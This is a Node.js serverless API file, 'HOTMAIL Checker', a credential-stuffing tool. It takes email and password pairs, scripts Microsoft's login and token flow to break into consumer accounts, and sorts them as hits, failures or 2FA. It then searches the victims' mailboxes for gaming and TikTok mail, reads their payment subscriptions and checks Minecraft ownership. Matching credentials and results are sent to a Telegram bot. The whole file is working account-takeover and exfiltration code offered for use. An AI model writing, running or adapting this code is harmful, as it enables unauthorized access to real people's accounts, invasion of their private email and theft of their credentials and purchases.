/**
 * HOTMAIL Checker v2.0 - Node.js API for Vercel
 * Converted from PHP - 100% logic preserved
 * Supports Telegram document file sending for combo hits
 */

export default async function handler(req, res) {
  // CORS headers
  res.setHeader('Content-Type', 'application/json');
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

  if (req.method === 'OPTIONS') {
    return res.status(200).end();
  }

  if (req.method !== 'POST') {
    return res.status(400).json({ error: 'POST only' });
  }

  const input = req.body || {};
  const action = input.action || '';

  try {
    switch (action) {
      case 'ping':
        return res.json({ ok: true, pong: true });
      case 'check':
        return await doCheck(input, res);
      case 'telegram_message':
        return await telegramSendMessage(input, res);
      case 'telegram_text':
        return await telegramSendText(input, res);
      case 'telegram_document':
        return await telegramSendDocument(input, res);
      default:
        return res.json({ error: 'Unknown action: ' + action });
    }
  } catch (e) {
    console.error('Handler error:', e);
    return res.status(500).json({ error: e.message });
  }
}

// ─────────────────────────────────────────────────────────────────────────────
// HTTP HELPER
// ─────────────────────────────────────────────────────────────────────────────
async function makeRequest(url, method = 'GET', headers = [], body = null, cookies = {}, followRedirect = true, proxy = null) {
  const headerObj = {};
  headers.forEach(h => {
    const idx = h.indexOf(':');
    if (idx > 0) {
      headerObj[h.substring(0, idx).trim()] = h.substring(idx + 1).trim();
    }
  });

  if (Object.keys(cookies).length > 0) {
    headerObj['Cookie'] = Object.entries(cookies).map(([k, v]) => `${k}=${v}`).join('; ');
  }

  const fetchOptions = {
    method,
    headers: headerObj,
    redirect: followRedirect ? 'follow' : 'manual',
    compress: true,
  };

  if (body && method === 'POST') {
    fetchOptions.body = body;
  }

  // Note: Proxy support would require a proxy agent in Node.js
  // For Vercel serverless, proxies are typically not used directly

  try {
    const response = await fetch(url, fetchOptions);
    const responseHeaders = response.headers;
    const responseBody = await response.text();
    
    // Extract cookies from response
    const setCookieHeaders = response.headers.getSetCookie ? response.headers.getSetCookie() : [];
    setCookieHeaders.forEach(cookieHeader => {
      const parts = cookieHeader.split(';')[0].split('=');
      if (parts.length >= 2) {
        cookies[parts[0].trim()] = parts.slice(1).join('=').trim();
      }
    });

    // Get location header
    const location = responseHeaders.get('location') || '';
    
    return {
      status: response.status,
      body: responseBody,
      headers: responseHeaders,
      location: location,
      url: response.url || url,
    };
  } catch (e) {
    console.error('Request error:', e);
    return { status: 0, body: '', headers: '', location: '', url: url };
  }
}

// ─────────────────────────────────────────────────────────────────────────────
// UUID GENERATOR
// ─────────────────────────────────────────────────────────────────────────────
function generateUUID() {
  return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, c => {
    const r = Math.random() * 16 | 0;
    return (c === 'x' ? r : (r & 0x3 | 0x8)).toString(16);
  });
}

// ─────────────────────────────────────────────────────────────────────────────
// MAIN CHECK FUNCTION (logic mirrors hatmil.py UnifiedChecker.check)
// ─────────────────────────────────────────────────────────────────────────────
async function doCheck(input, res) {
  const email = (input.email || '').trim();
  const password = (input.password || '').trim();
  const checkMode = input.checkMode || 'all';
  const proxy = input.proxy || null;

  if (!email || !password) {
    return res.json({ status: 'ERROR', reason: 'Missing credentials' });
  }

  const cookies = {};

  // ─── Step 1: HRD check ───────────────────────────────────────────────────
  const hrdUrl = `https://odc.officeapps.live.com/odc/emailhrd/getidp?hm=1&emailAddress=${encodeURIComponent(email)}`;
  const r1 = await makeRequest(hrdUrl, 'GET', [
    'X-OneAuth-AppName: Outlook Lite',
    'X-Office-Version: 3.11.0-minApi24',
    'User-Agent: Dalvik/2.1.0 (Linux; U; Android 9; SM-G975N Build/PQ3B.190801.08041932)',
    'Host: odc.officeapps.live.com',
    'Connection: Keep-Alive',
    'Accept-Encoding: gzip',
  ], null, cookies, true, proxy);

  const hrdBody = r1.body;
  if (hrdBody.includes('Neither') || hrdBody.includes('Both') ||
      hrdBody.includes('Placeholder') || hrdBody.includes('OrgId')) {
    return res.json({ status: 'BAD', reason: 'Not MSAccount' });
  }
  if (!hrdBody.includes('MSAccount')) {
    return res.json({ status: 'BAD', reason: 'Not MSAccount' });
  }

  await sleep(300); // 0.3s like hatmil.py

  // ─── Step 2: Get OAuth form ──────────────────────────────────────────────
  const authUrl = 'https://login.microsoftonline.com/consumers/oauth2/v2.0/authorize?' +
    `client_info=1&haschrome=1&login_hint=${encodeURIComponent(email)}&mkt=en` +
    '&response_type=code&client_id=e9b154d0-7658-433b-bb25-6b8e0a8a7c59' +
    '&scope=profile%20openid%20offline_access%20https%3A%2F%2Foutlook.office.com%2FM365.Access' +
    '&redirect_uri=msauth%3A%2F%2Fcom.microsoft.outlooklite%2Ffcg80qvoM1YMKJZibjBwQcDfOno%253D';

  const r2 = await makeRequest(authUrl, 'GET', [
    'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
    'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'Accept-Language: en-US,en;q=0.9',
    'Connection: keep-alive',
  ], null, cookies, true, proxy);

  const r2body = r2.body;

  // ─── Extract urlPost ─────────────────────────────────────────────────────
  let postUrl = '';
  const urlMatch = r2body.match(/urlPost":"([^"]+)"/) || 
                   r2body.match(/urlPost':'([^']+)'/) ||
                   r2body.match(/["']urlPost["']\s*:\s*["']((?:[^"'"\\]|\\.)*)["']/s);
  if (urlMatch) postUrl = urlMatch[1];

  if (!postUrl) {
    return res.json({ status: 'BAD', reason: 'No urlPost' });
  }

  // ─── Extract PPFT ────────────────────────────────────────────────────────
  let ppft = '';
  const ppftMatch = r2body.match(/name="PPFT"\s+id="i0327"\s+value="([^"]+)"/) ||
                    r2body.match(/name="PPFT"[^>]*value="([^"]+)"/) ||
                    r2body.match(/value="([^"]+)"[^>]*name="PPFT"/) ||
                    r2body.match(/sFT\s*=\s*["']((?:[^"'\\]|\\.)*)["']/s);
  if (ppftMatch) ppft = ppftMatch[1];

  if (!ppft) {
    return res.json({ status: 'BAD', reason: 'No PPFT' });
  }

  // Fix escaped slashes
  postUrl = postUrl.replace(/\\\//g, '/');

  // ─── Step 3: POST login ──────────────────────────────────────────────────
  const loginData = new URLSearchParams({
    i13: '1',
    login: email,
    loginfmt: email,
    type: '11',
    LoginOptions: '1',
    lrt: '',
    lrtPartition: '',
    hisRegion: '',
    hisScaleUnit: '',
    passwd: password,
    ps: '2',
    psRNGCDefaultType: '',
    psRNGCEntropy: '',
    psRNGCSLK: '',
    canary: '',
    ctx: '',
    hpgrequestid: '',
    PPFT: ppft,
    PPSX: 'PassportR',
    NewUser: '1',
    FoundMSAs: '',
    fspost: '0',
    i21: '0',
    CookieDisclosure: '0',
    IsFidoSupported: '0',
    isSignupPost: '0',
    isRecoveryAttemptPost: '0',
    i19: '9960',
  }).toString();

  const r3 = await makeRequest(postUrl, 'POST', [
    'Content-Type: application/x-www-form-urlencoded',
    'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
    'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'Origin: https://login.live.com',
    'Referer: ' + r2.url,
  ], loginData, cookies, false, proxy);

  const r3body = r3.body;
  const r3lower = r3body.toLowerCase();
  const location = r3.location;

  // Check for bad credentials
  if (r3lower.includes('account or password is incorrect') ||
      (r3lower.match(/error/g) || []).length > 0) {
    return res.json({ status: 'BAD', reason: 'Wrong credentials' });
  }

  // Check for 2FA
  if (r3body.includes('https://account.live.com/identity/confirm') ||
      r3lower.includes('identity/confirm')) {
    return res.json({ status: '2FA', email, password });
  }

  if (r3body.includes('https://account.live.com/Consent') ||
      r3lower.includes('consent')) {
    return res.json({ status: '2FA', email, password });
  }

  // Check for abuse
  if (r3body.includes('https://account.live.com/Abuse') ||
      r3body.includes('Abuse')) {
    return res.json({ status: 'BAD', reason: 'Abuse' });
  }

  // Check for redirect
  if (!location) {
    return res.json({ status: 'BAD', reason: 'No redirect location' });
  }

  // Extract code
  const codeMatch = location.match(/code=([^&]+)/);
  if (!codeMatch) {
    return res.json({ status: 'BAD', reason: 'No code in redirect' });
  }

  const code = codeMatch[1];

  // Get MSPCID cookie
  let cid = '';
  for (const [k, v] of Object.entries(cookies)) {
    if (k.toUpperCase() === 'MSPCID') {
      cid = v.toUpperCase();
      break;
    }
  }

  if (!cid) {
    return res.json({ status: 'BAD', reason: 'No MSPCID cookie' });
  }

  // ─── Step 4: Exchange code for token ─────────────────────────────────────
  const tokenData = new URLSearchParams({
    client_info: '1',
    client_id: 'e9b154d0-7658-433b-bb25-6b8e0a8a7c59',
    redirect_uri: 'msauth%3A%2F%2Fcom.microsoft.outlooklite%2Ffcg80qvoM1YMKJZibjBwQcDfOno%253D',
    grant_type: 'authorization_code',
    code: code,
    scope: 'profile%20openid%20offline_access%20https%3A%2F%2Foutlook.office.com%2FM365.Access',
  }).toString();

  const r4 = await makeRequest('https://login.microsoftonline.com/consumers/oauth2/v2.0/token', 'POST', [
    'Content-Type: application/x-www-form-urlencoded',
  ], tokenData, {}, true, proxy);

  const tokenJson = JSON.parse(r4.body);
  if (!tokenJson.access_token) {
    return res.json({ status: 'BAD', reason: 'No access_token' });
  }

  const accessToken = tokenJson.access_token;

  // ─── Step 5: Service checks ──────────────────────────────────────────────
  const result = {
    status: 'HIT',
    email,
    password,
  };

  if (['microsoft', 'all'].includes(checkMode)) {
    const ms = await checkMicrosoftSubscriptions(accessToken, cid, cookies, proxy);
    result.msStatus = ms.status;
    result.subscriptions = ms.subscriptions;
  }

  if (['psn', 'all'].includes(checkMode)) {
    const psn = await checkOutlookService(accessToken, cid,
      'sony@txn-email.playstation.com OR sony@email02.account.sony.com OR PlayStation',
      50, cookies, proxy);
    result.psnStatus = psn.total > 0 ? 'HAS_ORDERS' : 'FREE';
    result.psnOrders = psn.total;
  }

  if (['steam', 'all'].includes(checkMode)) {
    const steam = await checkOutlookService(accessToken, cid,
      'noreply@steampowered.com OR steam',
      50, cookies, proxy);
    result.steamStatus = steam.total > 0 ? 'HAS_PURCHASES' : 'FREE';
    result.steamCount = steam.total;
  }

  if (['supercell', 'all'].includes(checkMode)) {
    const sc = await checkSupercell(accessToken, cid, cookies, proxy);
    result.supercellStatus = sc.length > 0 ? 'HAS_GAMES' : 'FREE';
    result.supercellGames = sc;
  }

  if (['tiktok', 'all'].includes(checkMode)) {
    const tt = await checkOutlookService(accessToken, cid,
      'TikTok OR tiktok.com',
      10, cookies, proxy);
    result.tiktokStatus = 'FREE';
    result.tiktokUsername = null;
    if (tt.username) {
      result.tiktokStatus = 'FOUND';
      result.tiktokUsername = tt.username;
    }
  }

  if (['minecraft', 'all'].includes(checkMode)) {
    const mc = await checkMinecraft(accessToken, proxy);
    result.minecraftStatus = mc.status;
    result.minecraftUsername = mc.username;
    result.minecraftUuid = mc.uuid;
  }

  return res.json(result);
}

// ─────────────────────────────────────────────────────────────────────────────
// OUTLOOK SEARCH
// ─────────────────────────────────────────────────────────────────────────────
async function outlookSearch(accessToken, cid, query, size, cookies, proxy) {
  const uuid = generateUUID();
  const payload = JSON.stringify({
    Cvid: uuid,
    Scenario: { Name: 'owa.react' },
    TimeZone: 'UTC',
    TextDecorations: 'Off',
    EntityRequests: [{
      EntityType: 'Conversation',
      ContentSources: ['Exchange'],
      Filter: { Or: [{ Term: { DistinguishedFolderName: 'msgfolderroot' } }] },
      From: 0,
      Query: { QueryString: query },
      Size: size,
      Sort: [{ Field: 'Time', SortDirection: 'Desc' }],
    }]
  });

  const r = await makeRequest('https://outlook.live.com/search/api/v2/query', 'POST', [
    'User-Agent: Outlook-Android/2.0',
    'Accept: application/json',
    'Authorization: Bearer ' + accessToken,
    'X-AnchorMailbox: CID:' + cid,
    'Content-Type: application/json',
  ], payload, {}, true, proxy);

  try {
    return JSON.parse(r.body);
  } catch {
    return {};
  }
}

async function checkOutlookService(accessToken, cid, query, size, cookies, proxy) {
  const data = await outlookSearch(accessToken, cid, query, size, cookies, proxy);
  let total = 0;
  let username = null;

  if (data.EntitySets && data.EntitySets[0] && data.EntitySets[0].ResultSets && data.EntitySets[0].ResultSets[0]) {
    const rs = data.EntitySets[0].ResultSets[0];
    total = rs.Total || 0;

    if (rs.Results) {
      for (const res of rs.Results.slice(0, 3)) {
        const preview = res.Preview || '';
        const m = preview.match(/@([a-zA-Z0-9_.]{2,24})/);
        if (m) {
          username = m[1];
          break;
        }
      }
    }
  }

  return { total, username };
}

async function checkSupercell(accessToken, cid, cookies, proxy) {
  const games = ['Clash of Clans', 'Clash Royale', 'Brawl Stars', 'Hay Day', 'Boom Beach'];
  const found = [];

  for (const game of games) {
    const data = await outlookSearch(accessToken, cid, game, 5, cookies, proxy);
    if (data.EntitySets) {
      for (const es of data.EntitySets) {
        if (es.ResultSets) {
          for (const rs of es.ResultSets) {
            if (rs.Total && rs.Total > 0) {
              found.push(game);
              break;
            }
          }
        }
      }
    }
    await sleep(200);
  }

  return found;
}

async function checkMicrosoftSubscriptions(accessToken, cid, cookies, proxy) {
  const userId = generateUUID().replace(/-/g, '').substring(0, 16);
  const stateJson = JSON.stringify({ userId, scopeSet: 'pidl' });
  const payUrl = 'https://login.live.com/oauth20_authorize.srf?' +
    'client_id=000000000004773A&response_type=token' +
    '&scope=PIFD.Read+PIFD.Create+PIFD.Update+PIFD.Delete' +
    '&redirect_uri=https%3A%2F%2Faccount.microsoft.com%2Fauth%2Fcomplete-silent-delegate-auth' +
    `&state=${encodeURIComponent(stateJson)}&prompt=none`;

  const r = await makeRequest(payUrl, 'GET', [
    'Host: login.live.com',
    'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
    'Accept: text/html,application/xhtml+xml',
    'Accept-Language: en-US,en;q=0.5',
    'Connection: keep-alive',
    'Referer: https://account.microsoft.com/',
  ], null, cookies, true, proxy);

  let paymentToken = null;
  const searchText = r.body + ' ' + r.url;

  const tokenMatch = searchText.match(/access_token=([^&\s"']+)/) ||
                     searchText.match(/"access_token":"([^"]+)"/);
  if (tokenMatch) {
    paymentToken = decodeURIComponent(tokenMatch[1]);
  }

  const subscriptions = [];

  if (paymentToken) {
    const transUrl = 'https://paymentinstruments.mp.microsoft.com/v6.0/users/me/paymentTransactions';
    const rt = await makeRequest(transUrl, 'GET', [
      'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
      'Accept: application/json',
      `Authorization: MSADELEGATE1.0="${paymentToken}"`,
      'Content-Type: application/json',
      'Host: paymentinstruments.mp.microsoft.com',
      'ms-cV: ' + generateUUID(),
      'Origin: https://account.microsoft.com',
      'Referer: https://account.microsoft.com/',
    ], null, {}, true, proxy);

    if (rt.status === 200) {
      const responseText = rt.body;
      const keywords = {
        'Xbox Game Pass Ultimate': 'GAME PASS ULTIMATE',
        'PC Game Pass': 'PC GAME PASS',
        'Xbox Game Pass': 'GAME PASS',
        'EA Play': 'EA PLAY',
        'Xbox Live Gold': 'XBOX LIVE GOLD',
        'Microsoft 365 Family': 'M365 FAMILY',
        'Microsoft 365 Personal': 'M365 PERSONAL',
        'Office 365': 'OFFICE 365',
        'OneDrive': 'ONEDRIVE',
      };

      for (const [keyword, type] of Object.entries(keywords)) {
        if (responseText.includes(keyword)) {
          const sub = { name: type };
          const rm = responseText.match(/"nextRenewalDate"\s*:\s*"([^T"]+)/);
          if (rm) sub.renewal_date = rm[1];
          const am = responseText.match(/"autoRenew"\s*:\s*(true|false)/);
          if (am) sub.auto_renew = am[1] === 'true' ? 'YES' : 'NO';
          subscriptions.push(sub);
        }
      }
    }
  }

  return {
    status: subscriptions.length > 0 ? 'PREMIUM' : 'FREE',
    subscriptions,
  };
}

async function checkMinecraft(accessToken, proxy) {
  const r = await makeRequest('https://api.minecraftservices.com/minecraft/profile', 'GET', [
    'Authorization: Bearer ' + accessToken,
  ], null, {}, true, proxy);

  try {
    const data = JSON.parse(r.body);
    if (r.status === 200 && data.name) {
      return {
        status: 'OWNED',
        username: data.name,
        uuid: data.id || '',
      };
    }
  } catch {}

  return { status: 'FREE', username: null, uuid: '' };
}

// ─────────────────────────────────────────────────────────────────────────────
// TELEGRAM HELPERS
// ─────────────────────────────────────────────────────────────────────────────
async function telegramSendMessage(input, res) {
  const token = input.token || '';
  const chatId = input.chatId || '';
  const text = input.text || '';

  if (!token || !chatId) {
    return res.json({ ok: false, error: 'Missing token/chatId' });
  }

  try {
    const response = await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: chatId,
        text: text,
        parse_mode: 'HTML',
      }),
    });

    const resp = await response.json();
    return res.json({ ok: resp.ok || false });
  } catch (e) {
    return res.json({ ok: false, error: e.message });
  }
}

async function telegramSendText(input, res) {
  const token = input.token || '';
  const chatId = input.chatId || '';
  const filename = input.filename || 'results.txt';
  const content = input.content || '';

  if (!token || !chatId) {
    return res.json({ ok: false });
  }

  const lines = content.split('\n').filter(l => l.trim() && !l.trim().startsWith('#'));

  if (lines.length === 0) {
    return res.json({ ok: true });
  }

  const chunkSize = 50;
  let ok = true;

  for (let i = 0; i < lines.length; i += chunkSize) {
    const chunk = lines.slice(i, i + chunkSize);
    const msgText = `📄 <b>${filename}</b>\n\n<code>${chunk.join('\n')}</code>`;

    try {
      const response = await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: chatId,
          text: msgText,
          parse_mode: 'HTML',
        }),
      });

      const resp = await response.json();
      if (!resp.ok) ok = false;
    } catch {
      ok = false;
    }

    await sleep(1000);
  }

  return res.json({ ok });
}

/**
 * Send file as actual Telegram document (sendDocument)
 * This is the FIXED version that sends proper .txt files
 */
async function telegramSendDocument(input, res) {
  const token = input.token || '';
  const chatId = input.chatId || '';
  const filename = input.filename || 'results.txt';
  const content = input.content || '';
  const caption = input.caption || '';

  if (!token || !chatId) {
    return res.json({ ok: false, error: 'Missing token/chatId' });
  }

  try {
    // Create form data for document upload
    const formData = new FormData();
    formData.append('chat_id', chatId);
    formData.append('caption', caption);
    formData.append('parse_mode', 'HTML');
    
    // Create a Blob from the content and append as file
    const blob = new Blob([content], { type: 'text/plain' });
    formData.append('document', blob, filename);

    const response = await fetch(`https://api.telegram.org/bot${token}/sendDocument`, {
      method: 'POST',
      body: formData,
    });

    const resp = await response.json();
    return res.json({ ok: resp.ok || false });
  } catch (e) {
    console.error('Telegram document error:', e);
    return res.json({ ok: false, error: e.message });
  }
}

// ─────────────────────────────────────────────────────────────────────────────
// UTILITIES
// ─────────────────────────────────────────────────────────────────────────────
function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}